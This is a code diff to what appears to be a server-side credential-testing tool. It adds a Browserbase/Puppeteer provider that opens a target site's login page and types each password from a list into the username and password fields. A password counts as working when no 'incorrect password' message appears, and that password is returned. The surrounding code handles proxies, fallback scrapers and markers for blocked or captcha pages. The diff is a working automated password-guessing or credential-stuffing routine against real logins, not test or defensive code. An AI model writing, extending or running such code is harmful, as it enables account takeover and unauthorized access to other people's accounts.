@@ -3,6 +3,7 @@
 // Handles recording/screenshot storage to private file system
 
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';
+import puppeteer from 'npm:puppeteer-core@22.7.1';
 
 const SCRAPINGBEE_API_BASE = 'https://app.scrapingbee.com/api/v1/';
 const BLOCK_MARKERS = ['/blocked', '/error', '/access-denied', '/forbidden', '/captcha', '/challenge'];
@@ -371,6 +372,68 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
     return { site_key: site.key, status: data.status || 'error', final_url: data.final_url, working_password: data.working_password, elapsed_ms: elapsed, success_marker_found: data.status === 'working', screenshots: [] };
   }
 
+  if (provider === 'browserbase') {
+    const started = Date.now();
+    try {
+      const sessionRes = await fetch('https://www.browserbase.com/v1/sessions', {
+        method: 'POST',
+        headers: { 'X-BB-API-KEY': credentials.bbApiKey, 'Content-Type': 'application/json' },
+        body: JSON.stringify({ projectId: credentials.bbProjectId })
+      });
+      if (!sessionRes.ok) throw new Error(`Browserbase session failed: ${await sessionRes.text()}`);
+      const sessionData = await sessionRes.json();
+      
+      const browser = await puppeteer.connect({
+        browserWSEndpoint: `wss://connect.browserbase.com?apiKey=${credentials.bbApiKey}&sessionId=${sessionData.id}`,
+      });
+      
+      try {
+        const page = await browser.newPage();
+        await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
+        try {
+          await page.waitForSelector('#loginSubmit', { visible: true, timeout: 10000 });
+        } catch (_) {
+          // Ignore, we will try to type anyway if available
+        }
+
+        for (let i = 0; i < list.length; i++) {
+          const pw = list[i];
+          // Clear fields if possible
+          await page.evaluate(() => {
+            const u = document.querySelector('#username');
+            const p = document.querySelector('#password');
+            if (u) u.value = '';
+            if (p) p.value = '';
+          });
+
+          await page.type('#username', username, { delay: 50 });
+          await page.type('#password', pw, { delay: 50 });
+          
+          await Promise.all([
+            page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
+            page.click('#loginSubmit').catch(() => {})
+          ]);
+          
+          // Wait additional time for potential error messages to appear without navigation
+          await new Promise(r => setTimeout(r, 4000));
+          
+          const text = await page.evaluate(() => document.body.innerText.toLowerCase());
+          if (text.includes('disabled') || text.includes('has been disabled')) {
+            return { site_key: site.key, status: 'failed', final_url: page.url(), elapsed_ms: Date.now() - started, screenshots: [], success_marker_found: false };
+          }
+          if (!text.includes('incorrect password')) {
+            return { site_key: site.key, status: 'working', working_password: pw, final_url: page.url(), elapsed_ms: Date.now() - started, success_marker_found: true, screenshots: [] };
+          }
+        }
+        return { site_key: site.key, status: 'failed', final_url: page.url(), elapsed_ms: Date.now() - started, screenshots: [], success_marker_found: false };
+      } finally {
+        await browser.close().catch(() => {});
+      }
+    } catch (e) {
+      throw new Error(`Browserbase Advanced Error: ${e.message}`);
+    }
+  }
+
   if (provider === 'scrapingbee' || !provider) {
     for (const pw of list) {
       const attemptIndex = passwords.indexOf(pw) + 1;
@@ -548,15 +611,13 @@ Deno.serve(async (req) => {
 
       if (useLegacy || advancedResult === null) {
         // SECONDARY FALLBACK LAYER (Dormant/Redundancy)
-        if (provider === 'browserbase') {
-          r = { site_key: s.key, status: 'error', error_message: 'Browserbase fallback under active development.', elapsed_ms: Date.now() - started };
-        } else if (provider === 'browserless') {
-          r = { site_key: s.key, status: 'error', error_message: 'Browserless fallback under active development.', elapsed_ms: Date.now() - started };
+        if (provider === 'browserbase' || provider === 'browserless') {
+          r = { site_key: s.key, status: 'error', error_message: advancedError || `${provider} has no secondary fallback mode implemented.`, elapsed_ms: Date.now() - started };
         } else {
           r = await testSiteLegacy(providerCredentials.apiKey, settings, proxy, s, loginUrl, username, passwords, strategy);
         }
 
-        if (advancedError && r.status === 'error') {
+        if (advancedError && r.status === 'error' && provider !== 'browserbase' && provider !== 'browserless') {
           r.error_message = `[V7-V9 Error: ${advancedError}] Fallback: ${r.error_message}`;
         }
       } else {
